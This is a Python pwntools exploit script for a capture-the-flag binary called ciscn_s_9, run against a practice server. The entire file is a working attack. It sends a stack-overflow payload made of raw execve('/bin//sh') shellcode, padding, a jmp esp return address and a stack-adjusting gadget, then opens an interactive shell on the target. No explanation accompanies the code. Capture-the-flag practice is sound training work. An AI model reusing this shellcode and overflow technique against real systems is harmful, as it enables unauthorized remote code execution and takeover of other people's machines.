from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('ciscn_s_9')
io = remote('node4.buuoj.cn', 26443)
elf = ELF('ciscn_s_9')
jmp_esp = 0x08048554

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
gadget = 'sub esp, 0x28;jmp esp;'
payload = shellcode.ljust(0x24, b'\x00') + p32(jmp_esp) + asm(gadget)
io.sendlineafter('>\n', payload)
io.interactive()
